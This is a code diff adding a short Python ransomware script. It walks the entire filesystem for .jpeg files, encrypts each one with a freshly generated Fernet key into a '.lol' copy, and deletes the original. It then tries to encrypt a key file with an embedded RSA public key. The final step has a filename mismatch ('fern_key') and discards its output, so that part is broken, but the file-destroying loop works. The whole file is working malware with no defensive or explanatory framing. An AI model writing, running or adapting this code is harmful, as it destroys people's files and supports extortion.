@@ -1,0 +1,47 @@
+import os
+import rsa
+from cryptography.fernet import Fernet
+
+public_key_pem = """
+-----BEGIN RSA PUBLIC KEY-----
+MIIBCgKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wAUdCB
+8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSkxkDB
+d5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD8mdb
+AM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCjoB6I
+126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3htDL/W
+btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
+-----END RSA PUBLIC KEY-----"""
+
+file_extensions = ['.jpeg']
+file_paths = []
+for root, dirs, files_list, in os.walk('/'):
+     for file in files_list:
+          file_path = os.path.join(root, file)
+          file_ext = os.path.splitext(file_path)[1].lower()
+          if file_ext in file_extensions:
+               file_paths.append(file_path)
+
+fernet_key = Fernet.generate_key()
+with open("fernet_key", "wb") as file:
+    file.write(fernet_key)
+
+with open('fernet_key', 'rb') as file:
+    key = file.read()
+
+for file_path in file_paths:
+    with open(file_path, 'rb') as file:
+        file_data = file.read()
+    fernet = Fernet(key)
+    encrypted_data = fernet.encrypt(file_data)
+    new_file = file_path + ".lol"
+    with open(new_file, 'wb') as file:
+        file.write(encrypted_data)
+    os.remove(file_path)
+    
+public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())
+
+with open('fern_key', 'rb') as f:
+    data = f.read()
+
+
+encrytped_data = rsa.encrypt(data, public_key)
